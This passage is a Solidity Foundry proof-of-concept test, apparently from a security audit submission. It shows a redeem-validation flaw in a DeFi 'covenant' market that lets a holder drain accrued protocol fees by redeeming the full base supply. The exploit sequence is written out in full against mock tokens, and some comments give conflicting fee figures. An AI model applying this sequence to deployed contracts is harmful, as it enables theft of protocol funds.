n\n    function test_submissionValidity() public {\n        _setupMarketWithHighFees();\n\n        _mintTokens();\n\n        _advanceTimeForFeeAccrual();\n\n        _attemptFullRedeem();\n\n        _verifyVulnerability();\n    }\n\n    function _setupMarketWithHighFees() internal {\n        emit log_string(\"=== PoC: Redeem Validation Vulnerability - Protocol Fee Theft ===\");\n\n        emit log_string(\"Setting up market with high protocol fees to demonstrate the vulnerability\");\n\n        emit log_string(\"\");\n\n        // Set high protocol fee (5% TVL fee + 30% yield fee) to maximize fee accrual\n\n        uint32 protocolFee = UtilsLib.encodeFee(3000, 500); // 30% yield + 5% TVL\n\n        MarketParams memory marketParams = MarketParams({\n            baseToken: _mockBaseAsset, quoteToken: _mockQuoteAsset, curator: _mockOracle, lex: address(lex)\n        });\n\n        covenant.setMarketProtocolFee(_marketId, marketParams, hex\"\", 0, protocolFee);\n\n        emit log_named_uint(\"Protocol fee set\", protocolFee);\n    }\n\n    function _mintTokens() internal {\n        emit log_string(\"Minting tokens to establish base supply...\");\n\n        MarketParams memory marketParams = MarketParams({\n            baseToken: _mockBaseAsset, quoteToken: _mockQuoteAsset, curator: _mockOracle, lex: address(lex)\n        });\n\n        // Mint a large amount to have significant base supply\n\n        uint256 baseAmountIn = 50e18;\n\n        MockERC20(_mockBaseAsset).approve(address(covenant), baseAmountIn);\n\n        MintParams memory mintParams = MintParams({\n            marketId: _marketId,\n            marketParams: marketParams,\n            baseAmountIn: baseAmountIn,\n            to: address(this),\n            minATokenAmountOut: 0,\n            minZTokenAmountOut: 0,\n            data: hex\"\",\n            msgValue: 0\n        });\n\n        (uint256 aTokens, uint256 zTokens) = covenant.mint(mintParams);\n\n        MarketState memory state = covenant.getMarketState(_marketId);\n\n        emit log_named_uint(\"Base supply after mint\", state.baseSupply);\n\n        emit log_named_uint(\"ATokens minted\", aTokens);\n\n        emit log_named_uint(\"ZTokens minted\", zTokens);\n    }\n\n    function _advanceTimeForFeeAccrual() internal {\n        emit log_string(\"Advancing time to accrue significant protocol fees...\");\n\n        MarketState memory stateBefore = covenant.getMarketState(_marketId);\n\n        emit log_named_uint(\"Base supply before time advance\", stateBefore.baseSupply);\n\n        // Advance time significantly to accrue protocol fees\n\n        // With high fees (20% TVL + 30% yield), this should accrue substantial fees\n\n        vm.warp(block.timestamp + 365 days);\n\n        // Trigger a state update to accrue fees\n\n        MarketParams memory marketParams = MarketParams({\n            baseToken: _mockBaseAsset, quoteToken: _mockQuoteAsset, curator: _mockOracle, lex: address(lex)\n        });\n\n        covenant.updateState(_marketId, marketParams, hex\"\", 0);\n\n        MarketState memory stateAfter = covenant.getMarketState(_marketId);\n\n        uint256 feesAccrued = stateBefore.baseSupply - stateAfter.baseSupply;\n\n        emit log_named_uint(\"Base supply after time advance\", stateAfter.baseSupply);\n\n        emit log_named_uint(\"Protocol fees accrued\", feesAccrued);\n\n        emit log_named_uint(\"Protocol fee growth\", stateAfter.protocolFeeGrowth);\n    }\n\n    function _attemptFullRedeem() internal {\n        emit log_string(\"Attempting to redeem full base supply amount...\");\n\n        MarketState memory state = covenant.getMarketState(_marketId);\n\n        MarketParams memory marketParams = MarketParams({\n            baseToken: _mockBaseAsset, quoteToken: _mockQuoteAsset, curator: _mockOracle, lex: address(lex)\n        });\n\n        // Get synth token addresses\n\n        SynthTokens memory synthTokens = lex.getSynthTokens(_marketId);\n\n        // Get current token balances\n\n        uint256 aTokenBalance = IERC20(synthTokens.aToken).balanceOf(address(this));\n\n        uint256 zTokenBalance = IERC20(synthTokens.zToken).balanceOf(address(this));\n\n        emit log_named_uint(\"Current base supply\", state.baseSupply);\n\n        emit log_named_uint(\"AToken balance\", aTokenBalance);\n\n        emit log_named_uint(\"ZToken balance\", zTokenBalance);\n\n        // Try to redeem the full base supply amount\n\n        // This should fail validation but currently passes due to the bug\n\n        RedeemParams memory redeemParams = RedeemParams({\n            marketId: _marketId,\n            marketParams: marketParams,\n            aTokenAmountIn: aTokenBalance, // Use all aTokens\n            zTokenAmountIn: zTokenBalance, // Use all zTokens\n            to: address(this),\n            minAmountOut: 0, // Accept any amount\n            data: hex\"\",\n            msgValue: 0\n        });\n\n        // This call should succeed due to the vulnerability\n\n        uint256 amountOut = covenant.redeem(redeemParams);\n\n        emit log_named_uint(\"Amount redeemed\", amountOut);\n    }\n\n    function _verifyVulnerability() internal {\n        emit log_string(\"Verifying the vulnerability...\");\n\n        MarketState memory finalState = covenant.getMarketState(_marketId);\n\n        emit log_string(\"\");\n\n        emit log_string(\"VULNERABILITY ANALYSIS:\");\n\n        emit log_string(\"1. Validation checked: amountOut <= baseSupply (before fee accrual)\");\n\n        emit log_string(\"2. Actual deduction: baseSupply - amountOut - protocolFees\");\n\n        emit log_string(\"3. Should validate: amountOut <= baseSupply - protocolFees\");\n\n        emit log_string(\"4. Result: User stole protocol fees by redeeming more than available\");\n\n        emit log_named_uint(\"Final base supply\", finalState.baseSupply);\n\n        emit log_named_uint(\"Final protocol fee growth\", finalState.protocolFeeGrowth);\n\n        // The vulnerability is confirmed if base supply went negative or protocol fees were effectively stolen\n\n        if (finalState.baseSupply == 0) {\n            emit log_string(\"[X] VULNERABILITY CONFIRMED: Base supply depleted, protocol fees stolen!\");\n        } else {\n            emit log_string(\"[!] Unexpected result - base supply should be 0 or negative\");\n        }\n\n        // Assert that the vulnerability was demonstrated\n\n        assertEq(finalState.baseSupply, 0, \"Vulnerability: base supply should be 0 after full redeem\");\n    }\n}\n\n```",
